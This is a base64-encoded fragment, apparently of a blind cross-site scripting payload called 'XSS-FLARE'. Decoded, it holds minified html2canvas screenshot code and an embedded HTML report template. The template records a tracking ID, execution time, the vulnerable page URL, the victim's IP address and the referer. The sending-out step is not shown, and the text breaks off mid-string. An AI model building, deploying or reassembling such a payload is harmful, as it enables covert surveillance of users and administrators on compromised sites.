NdLndpZHRoLHQuYXJncz1GKHtjMTpbcyxhK2grclsyXS53aWR0aF0sYzI6W3MsYV0sYzM6W3MrYyxhK3JbMF0ud2lkdGhdLGM0OltzK2MsYStoXX0sblszXSxuWzBdLGkuYm90dG9tTGVmdE91dGVyLGkuYm90dG9tTGVmdElubmVyLGkudG9wTGVmdE91dGVyLGkudG9wTGVmdElubmVyKX19cmV0dXJuIHR9KX19LFAucHJvdG90eXBlLnBhcnNlQmFja2dyb3VuZENsaXA9ZnVuY3Rpb24odCxlLG4scixpKXt2YXIgbz10LmNzcygiYmFja2dyb3VuZENsaXAiKSxzPVtdO3N3aXRjaChvKXtjYXNlImNvbnRlbnQtYm94IjpjYXNlInBhZGRpbmctYm94IjpXKHMsclswXSxyWzFdLGUudG9wTGVmdElubmVyLGUudG9wUmlnaHRJbm5lcixpLmxlZnQrblszXS53aWR0aCxpLnRvcCtuWzBdLndpZHRoKSxXKHMsclsxXSxyWzJdLGUudG9wUmlnaHRJbm5lcixlLmJvdHRvbVJpZ2h0SW5uZXIsaS5sZWZ0K2kud2lkdGgtblsxXS53aWR0aCxpLnRvcCtuWzBdLndpZHRoKSxXKHMsclsyXSxyWzNdLGUuYm90dG9tUmlnaHRJbm5lcixlLmJvdHRvbUxlZnRJbm5lcixpLmxlZnQraS53aWR0aC1uWzFdLndpZHRoLGkudG9wK2kuaGVpZ2h0LW5bMl0ud2lkdGgpLFcocyxyWzNdLHJbMF0sZS5ib3R0b21MZWZ0SW5uZXIsZS50b3BMZWZ0SW5uZXIsaS5sZWZ0K25bM10ud2lkdGgsaS50b3AraS5oZWlnaHQtblsyXS53aWR0aCk7YnJlYWs7ZGVmYXVsdDpXKHMsclswXSxyWzFdLGUudG9wTGVmdE91dGVyLGUudG9wUmlnaHRPdXRlcixpLmxlZnQsaS50b3ApLFcocyxyWzFdLHJbMl0sZS50b3BSaWdodE91dGVyLGUuYm90dG9tUmlnaHRPdXRlcixpLmxlZnQraS53aWR0aCxpLnRvcCksVyhzLHJbMl0sclszXSxlLmJvdHRvbVJpZ2h0T3V0ZXIsZS5ib3R0b21MZWZ0T3V0ZXIsaS5sZWZ0K2kud2lkdGgsaS50b3AraS5oZWlnaHQpLFcocyxyWzNdLHJbMF0sZS5ib3R0b21MZWZ0T3V0ZXIsZS50b3BMZWZ0T3V0ZXIsaS5sZWZ0LGkudG9wK2kuaGVpZ2h0KX1yZXR1cm4gc30sUC5wcm90b3R5cGUucHNldWRvSGlkZUNsYXNzPSJfX19odG1sMmNhbnZhc19fX3BzZXVkb2VsZW1lbnQiO3ZhciBUZT0wO3BlLnByb3RvdHlwZS5yZW5kZXJJbWFnZT1mdW5jdGlvbih0LGUsbixyKXt2YXIgaT10LmNzc0ludCgicGFkZGluZ0xlZnQiKSxvPXQuY3NzSW50KCJwYWRkaW5nVG9wIikscz10LmNzc0ludCgicGFkZGluZ1JpZ2h0IiksYT10LmNzc0ludCgicGFkZGluZ0JvdHRvbSIpLGM9bi5ib3JkZXJzLGg9ZS53aWR0aC0oY1sxXS53aWR0aCtjWzNdLndpZHRoK2krcyksdT1lLmhlaWdodC0oY1swXS53aWR0aCtjWzJdLndpZHRoK28rYSk7dGhpcy5kcmF3SW1hZ2UociwwLDAsci5pbWFnZS53aWR0aHx8aCxyLmltYWdlLmhlaWdodHx8dSxlLmxlZnQraStjWzNdLndpZHRoLGUudG9wK28rY1swXS53aWR0aCxoLHUpfSxwZS5wcm90b3R5cGUucmVuZGVyQmFja2dyb3VuZD1mdW5jdGlvbih0LGUsbil7ZS5oZWlnaHQ+MCYmZS53aWR0aD4wJiYodGhpcy5yZW5kZXJCYWNrZ3JvdW5kQ29sb3IodCxlKSx0aGlzLnJlbmRlckJhY2tncm91bmRJbWFnZSh0LGUsbikpfSxwZS5wcm90b3R5cGUucmVuZGVyQmFja2dyb3VuZENvbG9yPWZ1bmN0aW9uKHQsZSl7dmFyIG49dC5jc3MoImJhY2tncm91bmRDb2xvciIpO3RoaXMuaXNUcmFuc3BhcmVudChuKXx8dGhpcy5yZWN0YW5nbGUoZS5sZWZ0LGUudG9wLGUud2lkdGgsZS5oZWlnaHQsdC5jc3MoImJhY2tncm91bmRDb2xvciIpKX0scGUucHJvdG90eXBlLnJlbmRlckJvcmRlcnM9ZnVuY3Rpb24odCl7dC5mb3JFYWNoKHRoaXMucmVuZGVyQm9yZGVyLHRoaXMpfSxwZS5wcm90b3R5cGUucmVuZGVyQm9yZGVyPWZ1bmN0aW9uKHQpe3RoaXMuaXNUcmFuc3BhcmVudCh0LmNvbG9yKXx8bnVsbD09PXQuYXJnc3x8dGhpcy5kcmF3U2hhcGUodC5hcmdzLHQuY29sb3IpfSxwZS5wcm90b3R5cGUucmVuZGVyQmFja2dyb3VuZEltYWdlPWZ1bmN0aW9uKHQsZSxuKXt2YXIgcj10LnBhcnNlQmFja2dyb3VuZEltYWdlcygpO3IucmV2ZXJzZSgpLmZvckVhY2goZnVuY3Rpb24ocixpLG8pe3N3aXRjaChyLm1ldGhvZCl7Y2FzZSJ1cmwiOnZhciBzPXRoaXMuaW1hZ2VzLmdldChyLmFyZ3NbMF0pO3M/dGhpcy5yZW5kZXJCYWNrZ3JvdW5kUmVwZWF0aW5nKHQsZSxzLG8ubGVuZ3RoLShpKzEpLG4pOkUoIkVycm9yIGxvYWRpbmcgYmFja2dyb3VuZC1pbWFnZSIsci5hcmdzWzBdKTticmVhaztjYXNlImxpbmVhci1ncmFkaWVudCI6Y2FzZSJncmFkaWVudCI6dmFyIGE9dGhpcy5pbWFnZXMuZ2V0KHIudmFsdWUpO2E/dGhpcy5yZW5kZXJCYWNrZ3JvdW5kR3JhZGllbnQoYSxlLG4pOkUoIkVycm9yIGxvYWRpbmcgYmFja2dyb3VuZC1pbWFnZSIsci5hcmdzWzBdKTticmVhaztjYXNlIm5vbmUiOmJyZWFrO2RlZmF1bHQ6RSgiVW5rbm93biBiYWNrZ3JvdW5kLWltYWdlIHR5cGUiLHIuYXJnc1swXSl9fSx0aGlzKX0scGUucHJvdG90eXBlLnJlbmRlckJhY2tncm91bmRSZXBlYXRpbmc9ZnVuY3Rpb24odCxlLG4scixpKXt2YXIgbz10LnBhcnNlQmFja2dyb3VuZFNpemUoZSxuLmltYWdlLHIpLHM9dC5wYXJzZUJhY2tncm91bmRQb3NpdGlvbihlLG4uaW1hZ2UscixvKSxhPXQucGFyc2VCYWNrZ3JvdW5kUmVwZWF0KHIpO3N3aXRjaChhKXtjYXNlInJlcGVhdC14IjpjYXNlInJlcGVhdCBuby1yZXBlYXQiOnRoaXMuYmFja2dyb3VuZFJlcGVhdFNoYXBlKG4scyxvLGUsZS5sZWZ0K2lbM10sZS50b3Arcy50b3AraVswXSw5OTk5OSxuLmltYWdlLmhlaWdodCxpKTticmVhaztjYXNlInJlcGVhdC15IjpjYXNlIm5vLXJlcGVhdCByZXBlYXQiOnRoaXMuYmFja2dyb3VuZFJlcGVhdFNoYXBlKG4scyxvLGUsZS5sZWZ0K3MubGVmdCtpWzNdLGUudG9wK2lbMF0sbi5pbWFnZS53aWR0aCw5OTk5OSxpKTticmVhaztjYXNlIm5vLXJlcGVhdCI6dGhpcy5iYWNrZ3JvdW5kUmVwZWF0U2hhcGUobixzLG8sZSxlLmxlZnQrcy5sZWZ0K2lbM10sZS50b3Arcy50b3AraVswXSxuLmltYWdlLndpZHRoLG4uaW1hZ2UuaGVpZ2h0LGkpO2JyZWFrO2RlZmF1bHQ6dGhpcy5yZW5kZXJCYWNrZ3JvdW5kUmVwZWF0KG4scyxvLHt0b3A6ZS50b3AsbGVmdDplLmxlZnR9LGlbM10saVswXSl9fSxwZS5wcm90b3R5cGUuaXNUcmFuc3BhcmVudD1mdW5jdGlvbih0KXtyZXR1cm4hdHx8InRyYW5zcGFyZW50Ij09PXR8fCJyZ2JhKDAsIDAsIDAsIDApIj09PXR9LGxlLnByb3RvdHlwZT1PYmplY3QuY3JlYXRlKFQucHJvdG90eXBlKSxsZS5wcm90b3R5cGUuZ2V0UGFyZW50U3RhY2s9ZnVuY3Rpb24odCl7dmFyIGU9dGhpcy5wYXJlbnQ/dGhpcy5wYXJlbnQuc3RhY2s6bnVsbDtyZXR1cm4gZT9lLm93blN0YWNraW5nP2U6ZS5nZXRQYXJlbnRTdGFjayh0KTp0LnN0YWNrfSxkZS5wcm90b3R5cGUudGVzdFJhbmdlQm91bmRzPWZ1bmN0aW9uKHQpe3ZhciBlLG4scixpLG89ITE7cmV0dXJuIHQuY3JlYXRlUmFuZ2UmJihlPXQuY3JlYXRlUmFuZ2UoKSxlLmdldEJvdW5kaW5nQ2xpZW50UmVjdCYmKG49dC5jcmVhdGVFbGVtZW50KCJib3VuZHRlc3QiKSxuLnN0eWxlLmhlaWdodD0iMTIzcHgiLG4uc3R5bGUuZGlzcGxheT0iYmxvY2siLHQuYm9keS5hcHBlbmRDaGlsZChuKSxlLnNlbGVjdE5vZGUobikscj1lLmdldEJvdW5kaW5nQ2xpZW50UmVjdCgpLGk9ci5oZWlnaHQsMTIzPT09aSYmKG89ITApLHQuYm9keS5yZW1vdmVDaGlsZChuKSkpLG99LGRlLnByb3RvdHlwZS50ZXN0Q09SUz1mdW5jdGlvbigpe3JldHVybiJ1bmRlZmluZWQiIT10eXBlb2YobmV3IEltYWdlKS5jcm9zc09yaWdpbn0sZGUucHJvdG90eXBlLnRlc3RTVkc9ZnVuY3Rpb24oKXt2YXIgdD1uZXcgSW1hZ2Usbj1lLmNyZWF0ZUVsZW1lbnQoImNhbnZhcyIpLHI9bi5nZXRDb250ZXh0KCIyZCIpO3Quc3JjPSJkYXRhOmltYWdlL3N2Zyt4bWwsPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnPjwvc3ZnPiI7dHJ5e3IuZHJhd0ltYWdlKHQsMCwwKSxuLnRvRGF0YVVSTCgpfWNhdGNoKGkpe3JldHVybiExfXJldHVybiEwfSxmZS5wcm90b3R5cGUuaGFzRmFicmljPWZ1bmN0aW9uKCl7cmV0dXJuIGh0bWwyY2FudmFzLmZhYnJpYz9Qcm9taXNlLnJlc29sdmUoKTpQcm9taXNlLnJlamVjdChuZXcgRXJyb3IoImh0bWwyY2FudmFzLnN2Zy5qcyBpcyBub3QgbG9hZGVkLCBjYW5ub3QgcmVuZGVyIHN2ZyIpKX0sZmUucHJvdG90eXBlLmlubGluZUZvcm1hdHRpbmc9ZnVuY3Rpb24odCl7cmV0dXJuL15kYXRhOmltYWdlXC9zdmdcK3htbDtiYXNlNjQsLy50ZXN0KHQpP3RoaXMuZGVjb2RlNjQodGhpcy5yZW1vdmVDb250ZW50VHlwZSh0KSk6dGhpcy5yZW1vdmVDb250ZW50VHlwZSh0KX0sZmUucHJvdG90eXBlLnJlbW92ZUNvbnRlbnRUeXBlPWZ1bmN0aW9uKHQpe3JldHVybiB0LnJlcGxhY2UoL15kYXRhOmltYWdlXC9zdmdcK3htbCg7YmFzZTY0KT8sLywiIil9LGZlLnByb3RvdHlwZS5pc0lubGluZT1mdW5jdGlvbih0KXtyZXR1cm4vXmRhdGE6aW1hZ2VcL3N2Z1wreG1sL2kudGVzdCh0KX0sZmUucHJvdG90eXBlLmNyZWF0ZUNhbnZhcz1mdW5jdGlvbih0KXt2YXIgZT10aGlzO3JldHVybiBmdW5jdGlvbihuLHIpe3ZhciBpPW5ldyBodG1sMmNhbnZhcy5mYWJyaWMuU3RhdGljQ2FudmFzKCJjIik7ZS5pbWFnZT1pLmxvd2VyQ2FudmFzRWwsaS5zZXRXaWR0aChyLndpZHRoKS5zZXRIZWlnaHQoci5oZWlnaHQpLmFkZChodG1sMmNhbnZhcy5mYWJyaWMudXRpbC5ncm91cFNWR0VsZW1lbnRzKG4scikpLnJlbmRlckFsbCgpLHQoaS5sb3dlckNhbnZhc0VsKX19LGZlLnByb3RvdHlwZS5kZWNvZGU2ND1mdW5jdGlvbihlKXtyZXR1cm4iZnVuY3Rpb24iPT10eXBlb2YgdC5hdG9iP3QuYXRvYihlKTpnZShlKX0sbWUucHJvdG90eXBlPU9iamVjdC5jcmVhdGUoZmUucHJvdG90eXBlKSx5ZS5wcm90b3R5cGU9T2JqZWN0LmNyZWF0ZShULnByb3RvdHlwZSkseWUucHJvdG90eXBlLmFwcGx5VGV4dFRyYW5zZm9ybT1mdW5jdGlvbigpe3RoaXMubm9kZS5kYXRhPXRoaXMudHJhbnNmb3JtKHRoaXMucGFyZW50LmNzcygidGV4dFRyYW5zZm9ybSIpKX0seWUucHJvdG90eXBlLnRyYW5zZm9ybT1mdW5jdGlvbih0KXt2YXIgZT10aGlzLm5vZGUuZGF0YTtzd2l0Y2godCl7Y2FzZSJsb3dlcmNhc2UiOnJldHVybiBlLnRvTG93ZXJDYXNlKCk7Y2FzZSJjYXBpdGFsaXplIjpyZXR1cm4gZS5yZXBsYWNlKC8oXnxcc3w6fC18XCh8XCkpKFthLXpdKS9nLHZlKTtjYXNlInVwcGVyY2FzZSI6cmV0dXJuIGUudG9VcHBlckNhc2UoKTtkZWZhdWx0OnJldHVybiBlfX0sd2UucHJvdG90eXBlPU9iamVjdC5jcmVhdGUoZi5wcm90b3R5cGUpLHhlLnByb3RvdHlwZT1PYmplY3QuY3JlYXRlKHBlLnByb3RvdHlwZSkseGUucHJvdG90eXBlLnNldEZpbGxTdHlsZT1mdW5jdGlvbih0KXtyZXR1cm4gdGhpcy5jdHguZmlsbFN0eWxlPXQsdGhpcy5jdHh9LHhlLnByb3RvdHlwZS5yZWN0YW5nbGU9ZnVuY3Rpb24odCxlLG4scixpKXt0aGlzLnNldEZpbGxTdHlsZShpKS5maWxsUmVjdCh0LGUsbixyKX0seGUucHJvdG90eXBlLmRyYXdTaGFwZT1mdW5jdGlvbih0LGUpe3RoaXMuc2hhcGUodCksdGhpcy5zZXRGaWxsU3R5bGUoZSkuZmlsbCgpfSx4ZS5wcm90b3R5cGUudGFpbnRzPWZ1bmN0aW9uKHQpe2lmKG51bGw9PT10LnRhaW50ZWQpe3RoaXMudGFpbnRDdHguZHJhd0ltYWdlKHQuaW1hZ2UsMCwwKTt0cnl7dGhpcy50YWludEN0eC5nZXRJbWFnZURhdGEoMCwwLDEsMSksdC50YWludGVkPSExfWNhdGNoKG4pe3RoaXMudGFpbnRDdHg9ZS5jcmVhdGVFbGVtZW50KCJjYW52YXMiKS5nZXRDb250ZXh0KCIyZCIpLHQudGFpbnRlZD0hMH19cmV0dXJuIHQudGFpbnRlZH0seGUucHJvdG90eXBlLmRyYXdJbWFnZT1mdW5jdGlvbih0LGUsbixyLGksbyxzLGEsYyl7KCF0aGlzLnRhaW50cyh0KXx8dGhpcy5vcHRpb25zLmFsbG93VGFpbnQpJiZ0aGlzLmN0eC5kcmF3SW1hZ2UodC5pbWFnZSxlLG4scixpLG8scyxhLGMpfSx4ZS5wcm90b3R5cGUuY2xpcD1mdW5jdGlvbih0LGUsbil7dGhpcy5jdHguc2F2ZSgpLHRoaXMuc2hhcGUodCkuY2xpcCgpLGUuY2FsbChuKSx0aGlzLmN0eC5yZXN0b3JlKCl9LHhlLnByb3RvdHlwZS5zaGFwZT1mdW5jdGlvbih0KXtyZXR1cm4gdGhpcy5jdHguYmVnaW5QYXRoKCksdC5mb3JFYWNoKGZ1bmN0aW9uKHQsZSl7dGhpcy5jdHhbMD09PWU/Im1vdmVUbyI6dFswXSsiVG8iXS5hcHBseSh0aGlzLmN0eCx0LnNsaWNlKDEpKX0sdGhpcyksdGhpcy5jdHguY2xvc2VQYXRoKCksdGhpcy5jdHh9LHhlLnByb3RvdHlwZS5mb250PWZ1bmN0aW9uKHQsZSxuLHIsaSxvKXt0aGlzLnNldEZpbGxTdHlsZSh0KS5mb250PVtlLG4scixpLG9dLmpvaW4oIiAiKX0seGUucHJvdG90eXBlLmZvbnRTaGFkb3c9ZnVuY3Rpb24odCxlLG4scil7dGhpcy5zZXRWYXJpYWJsZSgic2hhZG93Q29sb3IiLHQpLnNldFZhcmlhYmxlKCJzaGFkb3dPZmZzZXRZIixlKS5zZXRWYXJpYWJsZSgic2hhZG93T2Zmc2V0WCIsbikuc2V0VmFyaWFibGUoInNoYWRvd0JsdXIiLHIpfSx4ZS5wcm90b3R5cGUuY2xlYXJTaGFkb3c9ZnVuY3Rpb24oKXt0aGlzLnNldFZhcmlhYmxlKCJzaGFkb3dDb2xvciIsInJnYmEoMCwwLDAsMCkiKX0seGUucHJvdG90eXBlLnNldE9wYWNpdHk9ZnVuY3Rpb24odCl7dGhpcy5jdHguZ2xvYmFsQWxwaGE9dH0seGUucHJvdG90eXBlLnNldFRyYW5zZm9ybT1mdW5jdGlvbih0KXt0aGlzLmN0eC50cmFuc2xhdGUodC5vcmlnaW5bMF0sdC5vcmlnaW5bMV0pLHRoaXMuY3R4LnRyYW5zZm9ybS5hcHBseSh0aGlzLmN0eCx0Lm1hdHJpeCksdGhpcy5jdHgudHJhbnNsYXRlKC10Lm9yaWdpblswXSwtdC5vcmlnaW5bMV0pfSx4ZS5wcm90b3R5cGUuc2V0VmFyaWFibGU9ZnVuY3Rpb24odCxlKXtyZXR1cm4gdGhpcy52YXJpYWJsZXNbdF0hPT1lJiYodGhpcy52YXJpYWJsZXNbdF09dGhpcy5jdHhbdF09ZSksdGhpc30seGUucHJvdG90eXBlLnRleHQ9ZnVuY3Rpb24odCxlLG4pe3RoaXMuY3R4LmZpbGxUZXh0KHQsZSxuKX0seGUucHJvdG90eXBlLmJhY2tncm91bmRSZXBlYXRTaGFwZT1mdW5jdGlvbih0LGUsbixyLGksbyxzLGEsYyl7dmFyIGg9W1sibGluZSIsTWF0aC5yb3VuZChpKSxNYXRoLnJvdW5kKG8pXSxbImxpbmUiLE1hdGgucm91bmQoaStzKSxNYXRoLnJvdW5kKG8pXSxbImxpbmUiLE1hdGgucm91bmQoaStzKSxNYXRoLnJvdW5kKGErbyldLFsibGluZSIsTWF0aC5yb3VuZChpKSxNYXRoLnJvdW5kKGErbyldXTt0aGlzLmNsaXAoaCxmdW5jdGlvbigpe3RoaXMucmVuZGVyQmFja2dyb3VuZFJlcGVhdCh0LGUsbixyLGNbM10sY1swXSl9LHRoaXMpfSx4ZS5wcm90b3R5cGUucmVuZGVyQmFja2dyb3VuZFJlcGVhdD1mdW5jdGlvbih0LGUsbixyLGksbyl7dmFyIHM9TWF0aC5yb3VuZChyLmxlZnQrZS5sZWZ0K2kpLGE9TWF0aC5yb3VuZChyLnRvcCtlLnRvcCtvKTt0aGlzLnNldEZpbGxTdHlsZSh0aGlzLmN0eC5jcmVhdGVQYXR0ZXJuKHRoaXMucmVzaXplSW1hZ2UodCxuKSwicmVwZWF0IikpLHRoaXMuY3R4LnRyYW5zbGF0ZShzLGEpLHRoaXMuY3R4LmZpbGwoKSx0aGlzLmN0eC50cmFuc2xhdGUoLXMsLWEpfSx4ZS5wcm90b3R5cGUucmVuZGVyQmFja2dyb3VuZEdyYWRpZW50PWZ1bmN0aW9uKHQsZSl7aWYodCBpbnN0YW5jZW9mIHgpe3ZhciBuPXRoaXMuY3R4LmNyZWF0ZUxpbmVhckdyYWRpZW50KGUubGVmdCtlLndpZHRoKnQueDAsZS50b3ArZS5oZWlnaHQqdC55MCxlLmxlZnQrZS53aWR0aCp0LngxLGUudG9wK2UuaGVpZ2h0KnQueTEpO3QuY29sb3JTdG9wcy5mb3JFYWNoKGZ1bmN0aW9uKHQpe24uYWRkQ29sb3JTdG9wKHQuc3RvcCx0LmNvbG9yKX0pLHRoaXMucmVjdGFuZ2xlKGUubGVmdCxlLnRvcCxlLndpZHRoLGUuaGVpZ2h0LG4pfX0seGUucHJvdG90eXBlLnJlc2l6ZUltYWdlPWZ1bmN0aW9uKHQsbil7dmFyIHI9dC5pbWFnZTtpZihyLndpZHRoPT09bi53aWR0aCYmci5oZWlnaHQ9PT1uLmhlaWdodClyZXR1cm4gcjt2YXIgaSxvPWUuY3JlYXRlRWxlbWVudCgiY2FudmFzIik7cmV0dXJuIG8ud2lkdGg9bi53aWR0aCxvLmhlaWdodD1uLmhlaWdodCxpPW8uZ2V0Q29udGV4dCgiMmQiKSxpLmRyYXdJbWFnZShyLDAsMCxyLndpZHRoLHIuaGVpZ2h0LDAsMCxuLndpZHRoLG4uaGVpZ2h0KSxvfX0od2luZG93LGRvY3VtZW50KTsKCnZhciBSRVBPUlQgPSAiUENGRVQwTlVXVkJGSUdoMGJXdytDanhvZEcxc1BnbzhhR1ZoWkQ0S0NUeDBhWFJzWlQ1WVUxTXRSa3hCVWtVOEwzUnBkR3hsUGdvOEwyaGxZV1ErQ2p4aWIyUjVQZ29LUEdScGRqNEtDZ29KUEdneElITjBlV3hsUFNKdFlYSm5hVzQ2TGpZM1pXMGdNRHRtYjI1MExYTnBlbVU2TXpad2VEdG1iMjUwTFdaaGJXbHNlVHBwYm1obGNtbDBPMlp2Ym5RdGQyVnBaMmgwT2pVd01EdHNhVzVsTFdobGFXZG9kRG94TGpFN1kyOXNiM0k2YVc1b1pYSnBkRHR0WVhKbmFXNHRkRzl3T2pJd2NIZzdiV0Z5WjJsdUxXSnZkSFJ2YlRveE1IQjRPeUkrV0ZOVExVWk1RVkpGSUZKbGNHOXlkRHd2YURFK0NnbFVhR1VnZEhKaFkydHBibWNnU1VRZ1ptOXlJSFJvYVhNZ2NtVndiM0owSUdseklEeGpiMlJsSUhOMGVXeGxQU0ptYjI1MExXWmhiV2xzZVRwTlpXNXNieXdnVFc5dVlXTnZMQ0JEYjI1emIyeGhjeXdnSjBOdmRYSnBaWElnVG1WM0p5d2diVzl1YjNOd1lXTmxPMlp2Ym5RdGMybDZaVG81TUNVN2NHRmtaR2x1WnpveWNIZ2dOSEI0TzJOdmJHOXlPaU5qTnpJMU5HVTdZbUZqYTJkeWIzVnVaQzFqYjJ4dmNqb2paamxtTW1ZME95SStXMGxFWFR3dlkyOWtaVDRzSUhSb1pTQjBjbWxuWjJWeWFXNW5JR0p5YjNkelpYSWdjbVZ3YjNKMGN5QjBhR1VnZEdsdFpTQnZaaUJsZUdWamRYUnBiMjRnZEc4Z1ltVWdXMVJKVFVWZExnb0tDVHhvY2lCemRIbHNaVDBpYUdWcFoyaDBPakE3YldGeVoybHVMWFJ2Y0RveU1IQjRPMjFoY21kcGJpMWliM1IwYjIwNk1qQndlRHRpYjNKa1pYSTZNRHRpYjNKa1pYSXRkRzl3T2pGd2VDQnpiMnhwWkNBalpXVmxPeUkrUEdScGRpQmpiR0Z6Y3owaWNHRnVaV3dnY0dGdVpXd3RaR1ZtWVhWc2RDSWdjM1I1YkdVOUltMWhjbWRwYmkxaWIzUjBiMjA2TWpCd2VEdGlZV05yWjNKdmRXNWtMV052Ykc5eU9pTm1abVk3WW05eVpHVnlPakZ3ZUNCemIyeHBaQ0IwY21GdWMzQmhjbVZ1ZER0aWIzSmtaWEl0WTI5c2IzSTZJMlJrWkRzaVBnb0pDUWs4WkdsMklHTnNZWE56UFNKd1lXNWxiQzFvWldGa2FXNW5JaUJ6ZEhsc1pUMGljR0ZrWkdsdVp6b3hNSEI0SURFMWNIZzdZbTl5WkdWeUxXSnZkSFJ2YlRveGNIZ2djMjlzYVdRZ2RISmhibk53WVhKbGJuUTdZMjlzYjNJNkl6TXpNenRpWVdOclozSnZkVzVrTFdOdmJHOXlPaU5tTldZMVpqVTdZbTl5WkdWeUxXTnZiRzl5T2lOa1pHUTdZbUZqYTJkeWIzVnVaQzF5WlhCbFlYUTZjbVZ3WldGMExYZzdJajRLQ1FrSkNUeG9NeUJqYkdGemN6MGljR0Z1Wld3dGRHbDBiR1VpSUhOMGVXeGxQU0ptYjI1MExXWmhiV2xzZVRwcGJtaGxjbWwwTzJadmJuUXRkMlZwWjJoME9qVXdNRHRzYVc1bExXaGxhV2RvZERveExqRTdZMjlzYjNJNmFXNW9aWEpwZER0dFlYSm5hVzR0ZEc5d09qQTdiV0Z5WjJsdUxXSnZkSFJ2YlRvd08yWnZiblF0YzJsNlpUb3hObkI0T3lJK1ZuVnNibVZ5WVdKc1pTQlFZV2RsSUZWU1REd3ZhRE0rQ2drSkNUd3ZaR2wyUGdvSkNRazhaR2wySUdOc1lYTnpQU0p3WVc1bGJDMWliMlI1SWlCemRIbHNaVDBpY0dGa1pHbHVaem94TlhCNE95SStDZ2tKQ1FrOFlTQm9jbVZtUFNKYlZWSkpYU0lnYzNSNWJHVTlJbUpoWTJ0bmNtOTFibVF0WTI5c2IzSTZkSEpoYm5Od1lYSmxiblE3WTI5c2IzSTZJek16TjJGaU56dDBaWGgwTFdSbFkyOXlZWFJwYjI0NmRXNWtaWEpzYVc1bE95SWdjbVZzUFNKdWIyWnZiR3h2ZHlJK1cxVlNTVjA4TDJFK0Nna0pDVHd2WkdsMlBnb0pDVHd2WkdsMlBnb0tDUWs4WkdsMklHTnNZWE56UFNKd1lXNWxiQ0J3WVc1bGJDMWtaV1poZFd4MElpQnpkSGxzWlQwaWJXRnlaMmx1TFdKdmRIUnZiVG95TUhCNE8ySmhZMnRuY205MWJtUXRZMjlzYjNJNkkyWm1aanRpYjNKa1pYSTZNWEI0SUhOdmJHbGtJSFJ5WVc1emNHRnlaVzUwTzJKdmNtUmxjaTFqYjJ4dmNqb2paR1JrT3lJK0Nna0pDVHhrYVhZZ1kyeGhjM005SW5CaGJtVnNMV2hsWVdScGJtY2lJSE4wZVd4bFBTSndZV1JrYVc1bk9qRXdjSGdnTVRWd2VEdGliM0prWlhJdFltOTBkRzl0T2pGd2VDQnpiMnhwWkNCMGNtRnVjM0JoY21WdWREdGpiMnh2Y2pvak16TXpPMkpoWTJ0bmNtOTFibVF0WTI5c2IzSTZJMlkxWmpWbU5UdGliM0prWlhJdFkyOXNiM0k2STJSa1pEdGlZV05yWjNKdmRXNWtMWEpsY0dWaGREcHlaWEJsWVhRdGVEc2lQZ29KQ1FrSlBHZ3pJR05zWVhOelBTSndZVzVsYkMxMGFYUnNaU0lnYzNSNWJHVTlJbVp2Ym5RdFptRnRhV3g1T21sdWFHVnlhWFE3Wm05dWRDMTNaV2xuYUhRNk5UQXdPMnhwYm1VdGFHVnBaMmgwT2pFdU1UdGpiMnh2Y2pwcGJtaGxjbWwwTzIxaGNtZHBiaTEwYjNBNk1EdHRZWEpuYVc0dFltOTBkRzl0T2pBN1ptOXVkQzF6YVhwbE9qRTJjSGc3SWo1VmMyVnlJRWxRSUVGa1pISmxjM004TDJnelBnb0pDUWs4TDJScGRqNEtDUWtKUEdScGRpQmpiR0Z6Y3owaWNHRnVaV3d0WW05a2VTSWdjM1I1YkdVOUluQmhaR1JwYm1jNk1UVndlRHNpUGdvSkNRa0pQR0VnYUhKbFpqMGlhSFIwY0RvdkwzZDNkeTVwY0MxMGNtRmphMlZ5TG05eVp5OXNiMk5oZEc5eUwybHdMV3h2YjJ0MWNDNXdhSEEvYVhBOVcwOVNTVWRKVGwwaUlITjBlV3hsUFNKaVlXTnJaM0p2ZFc1a0xXTnZiRzl5T25SeVlXNXpjR0Z5Wlc1ME8yTnZiRzl5T2lNek16ZGhZamM3ZEdWNGRDMWtaV052Y21GMGFXOXVPblZ1WkdWeWJHbHVaVHNpSUhKbGJEMGlibTltYjJ4c2IzY2lQbHRQVWtsSFNVNWRQQzloUGdvSkNRazhMMlJwZGo0S0NRazhMMlJwZGo0S0Nna0pQR1JwZGlCamJHRnpjejBpY0dGdVpXd2djR0Z1Wld3dFpHVm1ZWFZzZENJZ2MzUjViR1U5SW0xaGNtZHBiaTFpYjNSMGIyMDZNakJ3ZUR0aVlXTnJaM0p2ZFc1a0xXTnZiRzl5T2lObVptWTdZbTl5WkdWeU9qRndlQ0J6YjJ4cFpDQjBjbUZ1YzNCaGNtVnVkRHRpYjNKa1pYSXRZMjlzYjNJNkkyUmtaRHNpUGdvSkNRazhaR2wySUdOc1lYTnpQU0p3WVc1bGJDMW9aV0ZrYVc1bklpQnpkSGxzWlQwaWNHRmtaR2x1WnpveE1IQjRJREUxY0hnN1ltOXlaR1Z5TFdKdmRIUnZiVG94Y0hnZ2MyOXNhV1FnZEhKaGJuTndZWEpsYm5RN1kyOXNiM0k2SXpNek16dGlZV05yWjNKdmRXNWtMV052Ykc5eU9pTm1OV1kxWmpVN1ltOXlaR1Z5TFdOdmJHOXlPaU5rWkdRN1ltRmphMmR5YjNWdVpDMXlaWEJsWVhRNmNtVndaV0YwTFhnN0lqNEtDUWtKQ1R4b015QmpiR0Z6Y3owaWNHRnVaV3d0ZEdsMGJHVWlJSE4wZVd4bFBTSm1iMjUwTFdaaGJXbHNlVHBwYm1obGNtbDBPMlp2Ym5RdGQyVnBaMmgwT2pVd01EdHNhVzVsTFdobGFXZG9kRG94TGpFN1kyOXNiM0k2YVc1b1pYSnBkRHR0WVhKbmFXNHRkRzl3T2pBN2JXRnlaMmx1TFdKdmRIUnZiVG93TzJadmJuUXRjMmw2WlRveE5uQjRPeUkrVW1WbVpYSmxjand2YURNK0Nna0pDVHd2WkdsMlBnb0pDUWs4WkdsMklHTnNZWE56UFNKd1lXNWxiQzFpYjJSNUlpQnpkSGxzWlQwaWNHRmtaR2x1WnpveE5YQjRPeUkrQ2drSkNRazhZU0JvY21WbVBTSmJVa1ZHUlZKU1JWSmRJaUJ6ZEhsc1pUMGlZbUZqYTJkeWIzVnVaQzFqYjJ4dmNqcDBjbUZ1YzNCaGNtVnVkRHRqYjJ4dmNqb2pNek0zWVdJM08zUmxlSFF0WkdWamIzSmhkR2x2YmpwMWJtUmxjbXhwYm1VN0lpQnlaV3c5SW01dlptOXNiRzkzSWo1YlVrVkdSVkpTUlZKZFBDOWhQZ29KQ1FrOEwyUnBkajRLQ1FrOEwyUnBkajRLQ2drSlBHUnBkaUJqYkdGemN6MGljR0Z1Wld3Z2NH